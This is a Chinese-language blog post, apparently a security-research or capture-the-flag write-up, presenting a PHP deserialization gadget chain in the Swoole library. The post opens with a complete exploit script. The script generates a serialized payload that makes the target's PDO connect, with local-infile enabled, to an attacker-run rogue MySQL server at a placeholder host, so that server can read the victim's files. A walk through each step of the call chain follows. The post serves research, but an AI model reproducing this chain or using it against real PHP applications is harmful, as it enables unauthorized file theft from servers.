@@ -1,0 +1,359 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Swoole deserialization Gadgets | 离怀秋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="First Gadgets–Rouge MySQL ServerExploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Swoole deserialization Gadgets">
+<meta property="og:url" content="http://yoursite.com/2020/09/09/Swoole-deserialization-Gadgets/index.html">
+<meta property="og:site_name" content="离怀秋">
+<meta property="og:description" content="First Gadgets–Rouge MySQL ServerExploit">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/08/wQN7sU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/08/wQgXu9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/08/wlcNH1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/09/w1RTOg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/09/09/w1o3NQ.png">
+<meta property="article:published_time" content="2020-09-09T07:40:49.000Z">
+<meta property="article:modified_time" content="2020-09-09T07:43:04.256Z">
+<meta property="article:author" content="离怀秋">
+<meta property="article:tag" content="Swoole">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/09/08/wQN7sU.png">
+  
+    <link rel="alternative" href="/atom.xml" title="离怀秋" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<div id="container">
+  <div id="wrap">
+    <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">离怀秋</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+          <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="Search">
+          <input type="submit" value="" class="search-form-submit">
+          <input name=tn type=hidden value="bds">
+          <input name=cl type=hidden value="3">
+          <input name=ct type=hidden value="2097152">
+          <input type="hidden" name="si" value="yoursite.com">
+        </form>
+      </div>
+    </div>
+  </div>
+</header>
+    <div class="outer">
+      <section id="main"><article id="post-Swoole-deserialization-Gadgets" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/09/09/Swoole-deserialization-Gadgets/" class="article-date">
+  <time datetime="2020-09-09T07:40:49.000Z" itemprop="datePublished">2020-09-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Swoole deserialization Gadgets
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="First-Gadgets–Rouge-MySQL-Server"><a href="#First-Gadgets–Rouge-MySQL-Server" class="headerlink" title="First Gadgets–Rouge MySQL Server"></a>First Gadgets–Rouge MySQL Server</h3><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><a id="more"></a>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeProperty</span> <span class="params">($object, $property, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $a = <span class="keyword">new</span> ReflectionClass($object);</span><br><span class="line">    $b = $a-&gt;getProperty($property);</span><br><span class="line">    $b-&gt;setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    $b-&gt;setValue($object, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Part A</span></span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> \Swoole\Database\PDOConfig();</span><br><span class="line">$c-&gt;withHost(<span class="string">'ROUGE_MYSQL_SERVER'</span>);    <span class="comment">// your rouge-mysql-server host &amp; port</span></span><br><span class="line">$c-&gt;withPort(<span class="number">3306</span>);</span><br><span class="line">$c-&gt;withOptions([</span><br><span class="line">    \PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="number">1</span>,</span><br><span class="line">    \PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'select 1'</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> \Swoole\ConnectionPool(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; &#125;, <span class="number">0</span>, <span class="string">'\\Swoole\\Database\\PDOPool'</span>);</span><br><span class="line">changeProperty($a, <span class="string">'size'</span>, <span class="number">100</span>);</span><br><span class="line">changeProperty($a, <span class="string">'constructor'</span>, $c);</span><br><span class="line">changeProperty($a, <span class="string">'num'</span>, <span class="number">0</span>);</span><br><span class="line">changeProperty($a, <span class="string">'pool'</span>, <span class="keyword">new</span> \SplDoublyLinkedList());</span><br><span class="line"></span><br><span class="line"><span class="comment">// Part C</span></span><br><span class="line"></span><br><span class="line">$d = unserialize(base64_decode(<span class="string">'TzoyNDoiU3dvb2xlXERhdGFiYXNlXFBET1Byb3h5Ijo0OntzOjExOiIAKgBfX29iamVjdCI7TjtzOjIyOiIAKgBzZXRBdHRyaWJ1dGVDb250ZXh0IjtOO3M6MTQ6IgAqAGNvbnN0cnVjdG9yIjtOO3M6ODoiACoAcm91bmQiO2k6MDt9'</span>));</span><br><span class="line"><span class="comment">// This's Swoole\Database\MysqliProxy</span></span><br><span class="line">changeProperty($d, <span class="string">'constructor'</span>, [$a, <span class="string">'get'</span>]);</span><br><span class="line"></span><br><span class="line">$curl = <span class="keyword">new</span> \Swoole\Curl\Handler(<span class="string">'http://www.baidu.com'</span>);</span><br><span class="line">$curl-&gt;setOpt(CURLOPT_HEADERFUNCTION, [$d, <span class="string">'reconnect'</span>]);</span><br><span class="line">$curl-&gt;setOpt(CURLOPT_READFUNCTION, [$d, <span class="string">'get'</span>]);</span><br><span class="line"></span><br><span class="line">$ret = <span class="keyword">new</span> \Swoole\ObjectProxy(<span class="keyword">new</span> stdClass);</span><br><span class="line">changeProperty($ret, <span class="string">'__object'</span>, [$curl, <span class="string">'exec'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$s = serialize($ret);</span><br><span class="line">$s = preg_replace_callback(<span class="string">'/s:(\d+):"\x00(.*?)\x00/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'s:'</span> . ((int)$a[<span class="number">1</span>] - strlen($a[<span class="number">2</span>]) - <span class="number">2</span>) . <span class="string">':"'</span>;</span><br><span class="line">&#125;, $s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $s;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><p><a href="https://github.com/swoole/library/issues/34" target="_blank" rel="noopener">Hint</a></p>
+<p>根据上面的提示大概可以猜测出是通过Rogue MySQL Server来读取文件，但是在旧版本中mysql的连接与参数配置顺序是颠倒的</p>
+<p><img src="https://s1.ax1x.com/2020/09/08/wQN7sU.png" alt="wQN7sU.png"></p>
+<p>可以看到在左面旧版本中是进行先数据库连接，再进行数据库选项配置。</p>
+<p>并且在新版本中进行了更新，修复了Bug。</p>
+<p>而Gadgets的挖掘是以旧版本为基础的，所以无法通过mysqli的连接方式配合恶意mysql进行文件读取，但是还有PDO连接可以用，通过可以实现相同的效果。下面就是调用链的分析了</p>
+<p>ObjectProxy.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * This file is part of Swoole.</span><br><span class="line"> *</span><br><span class="line"> * @link     https:&#x2F;&#x2F;www.swoole.com</span><br><span class="line"> * @contact  team@swoole.com</span><br><span class="line"> * @license  https:&#x2F;&#x2F;github.com&#x2F;swoole&#x2F;library&#x2F;blob&#x2F;master&#x2F;LICENSE</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">declare(strict_types&#x3D;1);</span><br><span class="line"></span><br><span class="line">namespace Swoole;</span><br><span class="line"></span><br><span class="line">use TypeError;</span><br><span class="line"></span><br><span class="line">class ObjectProxy</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;** @var object *&#x2F;</span><br><span class="line">    protected $__object;</span><br><span class="line"></span><br><span class="line">    public function __construct($object)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!is_object($object)) &#123;</span><br><span class="line">            throw new TypeError(&#39;Non-object given&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;__object &#x3D; $object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke(...$arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;** @var mixed $object *&#x2F;</span><br><span class="line">        $object &#x3D; $this-&gt;__object;</span><br><span class="line">        return $object(...$arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终触发$object(…$arguments);的调用，而如果$object的赋值为[new A,’foo’]这样是可以调用A类的foo方法的，具体的demo如下</p>
+<p><img src="https://s1.ax1x.com/2020/09/08/wQgXu9.png" alt="wQgXu9.png"></p>
+<p>所以现在可以进行调用任意类的无参方法了，在这个Gadget中选取的Handler的exec方法</p>
+<p>Handler#exec</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进execute函数(关键部分)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($client-&gt;headers) &#123;</span><br><span class="line">    $cb = <span class="keyword">$this</span>-&gt;headerFunction;</span><br><span class="line">    <span class="keyword">if</span> ($client-&gt;statusCode &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $row = <span class="string">"HTTP/1.1 &#123;$client-&gt;statusCode&#125; "</span> . Status::getReasonPhrase($client-&gt;statusCode) . <span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($cb) &#123;</span><br><span class="line">            $cb(<span class="keyword">$this</span>, $row);</span><br><span class="line">        &#125;</span><br><span class="line">        $headerContent .= $row;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($client-&gt;headers <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        $row = <span class="string">"&#123;$k&#125;: &#123;$v&#125;\r\n"</span>;</span><br><span class="line">        <span class="keyword">if</span> ($cb) &#123;</span><br><span class="line">            $cb(<span class="keyword">$this</span>, $row);</span><br><span class="line">        &#125;</span><br><span class="line">        $headerContent .= $row;</span><br><span class="line">    &#125;</span><br><span class="line">    $headerContent .= <span class="string">"\r\n"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;info[<span class="string">'header_size'</span>] = strlen($headerContent);</span><br><span class="line">    <span class="keyword">if</span> ($cb) &#123;</span><br><span class="line">        $cb(<span class="keyword">$this</span>, <span class="string">''</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;info[<span class="string">'header_size'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($client-&gt;body <span class="keyword">and</span> <span class="keyword">$this</span>-&gt;readFunction) &#123;</span><br><span class="line">    $cb = <span class="keyword">$this</span>-&gt;readFunction;</span><br><span class="line">    $cb(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;outputStream, strlen($client-&gt;body));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到两个关键部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$cb = <span class="keyword">$this</span>-&gt;headerFunction;</span><br><span class="line">$cb(<span class="keyword">$this</span>, $row);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cb = <span class="keyword">$this</span>-&gt;readFunction;</span><br><span class="line">$cb(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;outputStream, strlen($client-&gt;body));</span><br></pre></td></tr></table></figure>
+
+<p>将第一个$cb设置为MysqliProxy#reconnect</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reconnect</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $constructor = <span class="keyword">$this</span>-&gt;constructor;</span><br><span class="line">    <span class="keyword">parent</span>::__construct($constructor());</span><br><span class="line">    <span class="keyword">$this</span>-&gt;round++;</span><br><span class="line">    <span class="comment">/* restore context */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;charsetContext) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__object-&gt;set_charset(<span class="keyword">$this</span>-&gt;charsetContext);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;setOptContext) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;setOptContext <span class="keyword">as</span> $opt =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__object-&gt;set_opt($opt, $val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;changeUserContext) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__object-&gt;change_user(...<span class="keyword">$this</span>-&gt;changeUserContext);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将$constructor设置为ConnectionPool#get</p>
+<p>跟进get函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool === <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'Pool has been closed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool-&gt;isEmpty() &amp;&amp; <span class="keyword">$this</span>-&gt;num &lt; <span class="keyword">$this</span>-&gt;size) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;make();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在满足一定条件的情况下进入make函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;num++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;proxy) &#123;</span><br><span class="line">            $connection = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;proxy(<span class="keyword">$this</span>-&gt;constructor);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $constructor = <span class="keyword">$this</span>-&gt;constructor;</span><br><span class="line">            $connection = $constructor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable $throwable) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;num--;</span><br><span class="line">        <span class="keyword">throw</span> $throwable;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;put($connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从以上代码可以看出make函数可以实例化任意类，所以我们可以将proxy设置为PDOPool，将constructor变量设置为PDOConfig，从而得到一个完整的PDO实例。接着跟进put函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span><span class="params">($connection)</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;pool === <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($connection !== <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool-&gt;push($connection);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* connection broken */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;num -= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;make();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在put函数中通过push将已经实例化好的类压入栈中，跟完make函数后，紧接着到下面的pop函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;pop();</span><br></pre></td></tr></table></figure>
+
+<p>将刚压入栈中的实例化PDOPool类弹出并返回作为父类的构造函数的参数传给__object变量</p>
+<p>参数设置部分代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeProperty</span> <span class="params">($object, $property, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $a = <span class="keyword">new</span> ReflectionClass($object);</span><br><span class="line">    $b = $a-&gt;getProperty($property);</span><br><span class="line">    $b-&gt;setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    $b-&gt;setValue($object, $value);</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> \Swoole\Database\PDOConfig();</span><br><span class="line">$c-&gt;withHost(<span class="string">'ROUGE_MYSQL_SERVER'</span>);    <span class="comment">// your rouge-mysql-server host &amp; port</span></span><br><span class="line">$c-&gt;withPort(<span class="number">3306</span>);</span><br><span class="line">$c-&gt;withOptions([</span><br><span class="line">    \PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="number">1</span>,</span><br><span class="line">    \PDO::MYSQL_ATTR_INIT_COMMAND =&gt; <span class="string">'select 1'</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">$a = <span class="keyword">new</span> \Swoole\ConnectionPool(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; &#125;, <span class="number">0</span>, <span class="string">'\\Swoole\\Database\\PDOPool'</span>);</span><br><span class="line">changeProperty($a, <span class="string">'size'</span>, <span class="number">100</span>);</span><br><span class="line">changeProperty($a, <span class="string">'constructor'</span>, $c);</span><br><span class="line">changeProperty($a, <span class="string">'num'</span>, <span class="number">0</span>);</span><br><span class="line">changeProperty($a, <span class="string">'pool'</span>, <span class="keyword">new</span> \SplDoublyLinkedList());</span><br></pre></td></tr></table></figure>
+
+<p>跟进父类__construct的构造函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectProxy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> object */</span></span><br><span class="line">    <span class="keyword">protected</span> $__object;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($object)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_object($object)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TypeError(<span class="string">'Non-object given'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__object = $object;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时ObjectProxy类的__object变量即为我们的PDOPool类</p>
+<p>不过还需要注意的是ConnectionPool类中的Pool变量为Channel类，在此版本已经移除了其序列化，所以我们需要fuzz下同时支持isEmpty/pop/Empty三种方法的内部类，fuzz结果如下：</p>
+<p><img src="https://s1.ax1x.com/2020/09/08/wlcNH1.png" alt="wlcNH1.png"></p>
+<p>从上面选取一个类使用即可。</p>
+<p>接着看第二个$cb的利用，设置Handler类readFunction为MysqliProxy中的get方法</p>
+<p>在触发get方法的时候，由于MysqliProxy并不存在这个方法，所以触发__call方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">(string $name, array $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> ($n = <span class="number">3</span>; $n--;) &#123;</span><br><span class="line">            $ret = @<span class="keyword">$this</span>-&gt;__object-&gt;&#123;$name&#125;(...$arguments);</span><br><span class="line">            <span class="keyword">if</span> ($ret === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="comment">/* non-IO method */</span></span><br><span class="line">.....</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* <span class="doctag">@noinspection</span> PhpUndefinedVariableInspection */</span></span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于MysqliProxy为ObjectProxy类的子类，所以这里实际触发的是PDOPool-&gt;get方法，最终完成PDO数据库连接，触发恶意mysql服务器完成数据读取，这里PDOPool类中的Pool变量并不用管，与ConnectPool类不同的是Pool变量是在反序列化的过程生成的，不会存在反序列化数据中。</p>
+<h4 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h4><p>1.利用反射进行属性修改</p>
+<p>2.寻找pop链的时候，注意父类与子类的联系，子类可以用父类的属性，比如在此pop链中MysqliProxy可以用父类ObjectProxy中_object的属性值。</p>
